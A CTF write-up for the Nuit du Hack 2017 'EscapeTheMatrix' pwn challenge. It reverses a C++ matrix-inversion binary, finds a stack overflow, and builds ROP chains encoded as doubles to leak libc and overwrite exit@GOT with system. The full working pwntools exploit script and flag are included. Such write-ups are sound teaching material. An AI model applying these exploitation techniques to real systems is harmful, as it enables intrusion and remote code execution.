---
layout: post
title: "Nuit du Hack CTF Quals 2017: EscapeTheMatrix (Exploit 400)"
author: f0rki, qqq
categories: writeup
tags: [cat/pwn, tool/pwntools, tool/ida]
---

* **Category:** Exploit
* **Points:** 400
* **Solves:** 12
* **Description:**

> The cake is a lie, but you already know that. You will meet soon the machine
> master. Feel free to speak with him, maybe if you speak right, you will
> understand the power of his mind.a
>
> Url tcp://escapethematrix.quals.nuitduhack.com:50505/
>
> Filename 	Size 	Hash (SHA-256)
>
> libc.so.6 	2.02 MB 	c01efbc3fd683182d2fe5ccecbc13e9d0ce2d2d26ed0063240d050952e3c09e7
>
> escapeTheMatrix 	14.34 kB 	c96e4875c0a90224a3cf6dca575022d28d8505712027755f585b3e38ecfe450a

## Write-up

As usual we are provided with a binary and a libc. From the presence of the
libc, it's pretty clear that we're supposed to get a shell. Why else would we
need it? ;) So first we took a look at what the binary does:

```
I am the Machine master give me a matrix please
Enter the number of lines :
2
Enter the number of collumns :
2
enter your datas :
1,1,1,1
This is your matrix
1,1,
1,1,

This is your result
-1,1,
1,0,
```

OK. That's not much. So we started to reverse the binary:

* It's C++, you can see that immediately due to the mangled STL symbols in the
  binary.
* There are a lot of floating point instructions (`xmm0` register usage all
  around). So apparently the matrix is filled with `double`.
* Exploit mitigations are pretty much disabled, except for NX and probably
  ASLR.

```
$ checksec escapeTheMatrix
[*] '/ctf/ndhquals2017/exploit/EscapeTheMatric_400/escapeTheMatrix'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

The only functionality of the program is:

1. Reads matrix from stdin (`0x400ef7`) with a maximum size of 16 × 16
2. Prints input matrix (`0x401200` called from `0x401018`)
3. Inverts matrix (`0x401326`)
4. Prints inverted matrix (`0x401200` called from `0x4010a2`)
5. Frees the matrix (`0x4012fc`) and exits

We figured that the operation is matrix inverse, because

1. We have the string `can't invert matrix` at 0x00401d39
2. And the function that performs the computation allocates temp matrices that
   have the dimension r × 2c. This looks like Gauss-Jordan.

The main matrix data structure, looks roughly like this:

```c++
struct Matrix {
    uint32_t has_heap_buffer;
    uint32_t rows;             // + 4
    uint32_t columns;          // + 8
    uint32_t unused_probably;
    double* flat_array;        // + 0x10
};
```

First we looked at the input reading and matrix initialization, but found no
issues there.  We noticed that it happily inverts a m × n non-quadratic matrix,
if m > n, but not of n > m. This gave us the idea that maybe during the
Gauss-Jordan inversion some out-of-bounds access could happen. So we reversed
the accessor functions, that map index pairs (i, j) to the flat array backing
the matrix. We didn't find any bugs there and they all feature proper bounds
checking. In retrospect we spent far too much time reversing this stuff. The
vulnerability was somewhere else.

Then we took a look at the memory allocations and where the matrices are
stored. Using `ltrace` we confirmed that our input is written to a matrix on
the heap and the `invert_matrix` function allocates two temporary matrices:

```
$ ltrace -C -i -e 'malloc+free' ./escapeTheMatrix
I am the Machine master give me a matrix please
Enter the number of lines :
2
Enter the number of collumns :
2
enter your datas :
1,1,1,1
[0x7f7303dcaa78] libstdc++.so.6->malloc(24)        = 0xf6c030
[0x401192] escapeTheMatrix->malloc(32)             = 0xf6c050
This is your matrix
1,1,
1,1,

This is your result
[0x401192] escapeTheMatrix->malloc(64)             = 0xf6c080
[0x401192] escapeTheMatrix->malloc(64)             = 0xf6c0d0
[0x401323] escapeTheMatrix->free(0xf6c0d0)         = <void>
[0x401323] escapeTheMatrix->free(0xf6c080)         = <void>
-1,1,
1,0,
```

We then noticed that there is another matrix involved, a `result_matrix`.

```c++
void invert_matrix(Matrix* matrix, Matrix* result_matrix);
```

But there seems to be no heap allocation for the second matrix. We then noticed
a suspicious call to a function we identified as a constructor for the `Matrix`
class.

```
0x00401046  lea rdx, [rbp-0x720]  // array
0x0040104d  lea rax, [rbp-0x740]  // this
0x00401054  mov rcx, rdx
0x00401057  mov edx, ebx
0x00401059  mov rdi, rax
// Matrix(Matrix* this, uint32_t rows, uint32_t cols, double* array)
// rdi: this == [rbp-0x740]
// rsi: cols == input_matrix.get_cols()
// rdx: rows == input_matrix.get_rows()
// rcx: array == [rbp-0x720]
0x0040105c  call matrix_constructor
```

So the result array is allocated on the stack. We have the following local
variables in main:

```
Matrix* result_matrix @ rbp-0x740
double[] result_array @ rbp-0x720
Matrix* input_matrix  @ rbp-0x18
```

So we have `0x720 - 0x18 == 0x708 == 1800` bytes for the result matrix.
Unfortunately a 16 × 16 matrix needs `16 * 16 * 8 == 2048`. So we have a
stack-based buffer overflow when we input the biggest possible matrix and we
can overwrite the return address. ROP ROP hooray. The
problem is that the overflowed values are the result of the matrix inverse
operation. Turns out this makes things a little tricky. The steps to exploit
this are:

1. Create ROP chain
2. Convert ROP chain to `double` values
3. Put converted ROP chain in the matrix `A`
4. Invert matrix `A` to `A'`
5. Provide inverted matrix `A'` as input
6. Program inverts the matrix `A'` back to `A` and writes ROP chain to the
   stack
7. Win

To achieve 2. we just packed the integer values we needed and unpacked them as
`double`:

```python
def d2i(f):
    return (u64(struct.pack("d", f)))

def i2d(i):
    return (struct.unpack("d", p64(i))[0])
```

So our first try was a simple infoleak ROP chain

```c
puts(GOT.puts);
```

We tried to use the pwntools `ROP` builder, but it often inserted a padding
value, that interfered with matrix inversion. So we built the ROP payload by
hand:

```python
chain0 = ROP(velf)
chain0.raw(poprdiret)
chain0.raw(velf.got['puts'])
chain0.raw(velf.symbols['puts'])
```

Then we put the ROP chain it into the matrix. We used `numpy` to perform the
matrix computations. We first created a 16 × 16 identity matrix. We then
reshaped the matrix to a flat array, to set the ROP chain values on the flat
array (you know less thinking). We know that the buffer starts at `rbp-0x720`.
So the return address is at `0x720//8 + 1 == 229`.

```python
import numpy as np
N = 16
retaddr_A_idx = 229  # == 0x720 // 8 + 1

A = np.eye(N)
Aflat = A.reshape(-1)

pl = chain.chain()

plf = struct.unpack('d' * (len(pl) / 8), pl)
for i, f in enumerate(plf):
    Aflat[retaddr_A_idx + i] = f

A = Aflat.reshape(N, N)
Ai = np.linalg.inv(A)
```

If the ROP chain is not too big, we get a lower triangular matrix, with all 1
in the main diagonal. This is a nice matrix, because it's definitely
invertible and the values in the lower part are just the negative of the
original matrix. Turns out this works pretty well and there seems to be no
rounding error when we put it through the `invert_matrix` function.

Locally we get a nice infoleak:

```
[*] exploiting with ropchain:
    0x0000:         0x401c33 pop rdi; ret
    0x0008:         0x603020 got.puts
    0x0010:         0x400a60 puts
[*] rop payload:
    00000000  33 1c 40 00  00 00 00 00  20 30 60 00  00 00 00 00  │3·@·│····│ 0`·│····│
    00000010  60 0a 40 00  00 00 00 00                            │`·@·│····││
    00000018
[*] setting 229 to 2.07582817451e-317
[*] setting 230 to 3.11447916068e-317
[*] setting 231 to 2.07357375297e-317
...
[*] input matrix:
    1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
    0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
    0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,
    0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,
    0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,
    0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,
    0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,
    0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,
    0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,
    0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,
    0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,
    0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,
    0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,
    0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,
    0,0,0,0,0,-2.07583e-317,-3.11448e-317,-2.07357e-317,0,0,0,0,0,0,1,0,
    0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,
[*] result matrix:
[*] leaked:
    00000000  10 11 7e b3  4a 7f                                  │··~·│J·│
    00000006
[*] puts @ 0x7f4ab37e1110
[*] leaked libc base at 0x7f4ab3777000, system at 0x7f4ab37b7d00
```

We then tried it on the server and received no output :( WTF. We speculated a
lot why this might be the case. Whether somehow the input was not parsed the
same way, i.e. the precision of `strtod` was different etc. This was kind of of
demotivating, but nevertheless we continued to construct a exploit that was
working locally. We started off by extending the first ROP:

```python
chain0 = ROP(velf)
# first infoleak libc address
chain0.raw(poprdiret)
chain0.raw(velf.got['puts'])
chain0.raw(velf.symbols['puts'])
# then call read(0, exit@GOT, X)
chain0.raw(poprdiret)
chain0.raw(0)  # stdin
chain0.raw(poprsir15)
chain0.raw(velf.got['exit'])
chain0.raw(0x42)  # dummy values
# call read and hope that rdx is something useful
chain0.raw(velf.symbols['read'])
# call corrupted exit
chain0.raw(velf.symbols['exit'])
```

Turns out this ROP chain was too big, we got a lot of `NaN`s from the inverted
matrix. damn. New constraint: shorter ROP chains. We modified the infoleak
ROP chain to to jump back to main:

```python
chain0 = ROP(velf)
# first infoleak libc address
chain0.raw(poprdiret)
chain0.raw(velf.got['puts'])
chain0.raw(velf.symbols['puts'])
# jump back to main and repeat
chain0.raw(main_addr)
```

This way we can repeat the whole process and overwrite the return address
again.
With the leaked libc address we constructed another small ROP payload:

```python
libc.address = puts_leaked - libc.symbols['puts']
chain1 = ROP([velf, libc])
chain1.raw(poprdiret)
chain1.raw(next(libc.search("/bin/sh\x00")))
chain1.raw(libc.symbols['system'])
```

This did not work *at all*. Apparently imprecision of the computation on the
`double` values was too high. The values we got on the stack were somewhere in
the libc, but far away from what we wanted... OK. New limitation, we cannot
directly use addresses of the libc in our ROP chain. The addresses in the main
binary worked pretty reliably so we are restricted to use those. Short recap:

1. We cannot use libc address in the ROP chain
2. The ROP chain must be `<= 9` slots for the matrix invert to work out

Now it's gonna get intereseting. We probably could've found a way to work
around 2 by continuing the ROP chain in the last row of the matrix and
adjusting the stack a little. But we didn't bother as using repeated corruption
by returning to main again worked pretty well.

In the second ROP chain we will now use a function from the binary to
overwrite the address of `exit` in the `GOT`. We used the 
`read_data(char*buffer, uint32_t size)` function at `0x400d75`. 
We couldn't find a gadget to set `rdx`, so we can't use `read` directly. How 
nice that there is a wrapper in the binary :) 

We overwrote the address of `exit` with the address of `system`. Now we just
need to set the first argument of `system` to something useful. Unfortunately
we didn't find a string `sh\x00` in the main binary. So we opted to write the
string into the `GOT`, directly after the `exit` entry.


```python
chain0 = ROP(velf)
# infoleak libc address
chain0.raw(poprdiret)
chain0.raw(velf.got['puts'])
chain0.raw(velf.symbols['puts'])
# back to main
chain0.raw(main_addr)

chain1 = ROP(velf)
# set first argument to exit@GOT
chain1.raw(poprdiret)
chain1.raw(velf.got['exit'])
# we ignore the second argument, worked anyway
chain1.raw(read_data_addr)
# set first argument to exit@GOT + 8
chain1.raw(poprdiret)
chain1.raw(shaddr)
# call system
chain1.raw(velf.symbols['exit'])
```

And we got a shell :) Remember we had problems with the infoleak on the remote
server. We just swapped libcs and tried it on the remote server and suddenly
our infoleak worked. Apparently it was a buffering issue and jumping back to
main made the infoleak work. We had to adapt the exploit a little and 2 minutes 
later we had a shell :).

```
# cat ~/flag
NDH{d7ef20eef497a1eb9d0d119b45b3855d72e7f594923670e7290aa940e4d3c6f5}
```

yes :)

Here is the full (and uncleaned) exploit script:

```python
#!/usr/bin/env python2
from __future__ import print_function
from pwn import *  # noqa
import numpy as np

gdbscript = """
init-pwndbg
# break exit
# break* 0x401b0d
# break* 0x40168f
# break* 0x4015a5
# break* 0x401a9d
# break* 0x4018e2
# break* 0x400dba
# break* 0x400de6
# break* 0x400e30
# break* 0x400e97
# break* 0x401a38

# break *0x401093
# break *0x4010e9

# break main
# break *0x400fa6

break *0x4010f2

print &system

# continue
continue
"""

vpenv = {"LD_PRELOAD": os.path.join(os.getcwd(), "libc.so.6")}


def d2h(f):
    return hex(u64(struct.pack("d", f)))


def d2i(f):
    return (u64(struct.pack("d", f)))


def i2d(i):
    return (struct.unpack("d", p64(i))[0])


def new_con():
    # with context.local(log_level='warning'):
    # rem = process("ltrace -C -f -i ./escapeTheMatrix 2>ltrace.log", shell=True)
    # rem = process("./escapeTheMatrix")  # , env=vpenv)
    # gdb.attach(rem, gdbscript)
    rem = remote("escapethematrix.quals.nuitduhack.com", 50505)
    return rem


velf = ELF("./escapeTheMatrix")
# libc = ELF("./libc.so.6")
libc = ELF("/usr/lib/libc-2.25.so")
context.arch = velf.arch

N = 16
retaddr_A_idx = 229

pollfailedstr = 0x00401c63

main_addr = 0x400fa6
fini_array = 0x00602de0
read_int_addr = 0x400ed0
read_data_addr = 0x400d75

poprdiret = 0x00401c33
poprsir15 = 0x00401c31

# shaddr = next(libc.search("/bin/sh\x00"))
# shaddr = 0x0060314f
shaddr = velf.got['exit'] + 8

# chain = ROP(velf)
# chain.raw(velf.symbols['puts'])
# chain.raw(velf.symbols['exit'])
# chain.puts(velf.symbols['exit'])
# chain.read(0, velf.symbols['exit'])
# chain.exit(42)

chain0 = ROP(velf)
chain0.raw(poprdiret)
chain0.raw(velf.got['puts'])
chain0.raw(velf.symbols['puts'])
# all the tries to get it working with a single rop chain...
# chain0.raw(poprdiret)
# chain0.raw(0)
# chain0.raw(poprsir15)
# chain0.raw(fini_array)
# chain0.raw(fini_array)
# chain0.raw(velf.symbols['read'])
# chain0.raw(velf.got['exit'])
# chain0.raw(velf.symbols['exit'])
# chain0.raw(main_addr)
# chain0.raw(0xdeadbeef)
# chain0.raw(poprdiret)
# chain0.raw(velf.got['exit'])
# chain0.raw(poprsir15)
# chain0.raw(8)
# chain0.raw(8)
# chain0.raw(read_data_addr)
# chain0.raw(poprdiret)
# chain0.raw(shaddr)
# chain0.raw(velf.symbols['exit'])
chain0.raw(main_addr)

# by using a second rop chain we don't have a problem with inverting
chain1 = ROP(velf)
chain1.raw(poprdiret)
chain1.raw(velf.got['exit'])
chain1.raw(read_data_addr)
chain1.raw(poprdiret)
chain1.raw(shaddr)
chain1.raw(velf.symbols['exit'])

log.info("rop chain0:\n" + chain0.dump())

# raw_input()


def exploit(chain):
    A = np.eye(N)
    Aflat = A.reshape(-1)

    log.info("exploiting with ropchain:\n" + chain.dump())
    rem.recvuntil(":")

    pl = chain.chain()
    log.info("rop payload:\n" + hexdump(pl))

    plf = struct.unpack('d' * (len(pl) / 8), pl)
    for i, f in enumerate(plf):
        log.info("setting {} to {}".format(retaddr_A_idx + i, f))
        Aflat[retaddr_A_idx + i] = f

    A = Aflat.reshape(N, N)
    log.info("Using matrix:\n" + str(A))
    Ai = np.linalg.inv(A)
    log.info("inverse:\n" + str(Ai))

    n, m = A.shape

    y = ["{}".format(x) for x in Ai.reshape(-1)]
    tldr = [s for s in y if len(s) > 20]
    if len(tldr) > 0:
        log.warning("uuuh there might be a strtod precision issue!\n{!r}"
                    .format(tldr))

    x = ",".join(y)
    log.info("sending the following line:\n{!r}".format(x))

    rem.sendline("{}".format(n))
    rem.recvuntil(":")
    rem.sendline("{}".format(m))
    rem.recvuntil("datas :")
    rem.sendline(x)

    rem.recvuntil("your matrix\n")
    # rem.recvline()
    m1 = ""
    for _ in range(16):
        m1 += rem.recvline()
    log.info("input matrix:\n" + m1)

    rem.recvuntil("your result \n")
    # rem.recvline()
    m2 = ""
    for _ in range(16):
        m1 += rem.recvline()
    log.info("result matrix:\n" + m2)

    rem.recvline(timeout=1)


rem = new_con()

exploit(chain0)

# raw_input()

# rem.recvline()
leak = rem.recvline().strip("\n")
log.info("leaked:\n" + hexdump(leak))

if not leak:
    log.error("failed to leak address!")

puts_addr = u64(leak.ljust(8, "\x00"))
log.info("puts @ 0x{:x}".format(puts_addr))
libc.address = puts_addr - libc.symbols['puts']
log.info("leaked libc base at 0x{:x}, system at 0x{:x}"
         .format(libc.address, libc.symbols['system']))

# old non-working ROP chain
# chain1 = ROP([velf, libc])
# chain1.raw(poprdiret)
# chain1.raw(shaddr + libc.address)
# chain1.raw(velf.symbols['exit'])

exploit(chain1)
rem.sendline(p64(libc.symbols['system']) + "sh\x00")

# rem.shutdown()
# log.info(hexdump(rem.recvall()))

with context.local(log_level='debug'):
    rem.interactive()
"""
NDH{d7ef20eef497a1eb9d0d119b45b3855d72e7f594923670e7290aa940e4d3c6f5}
"""
```
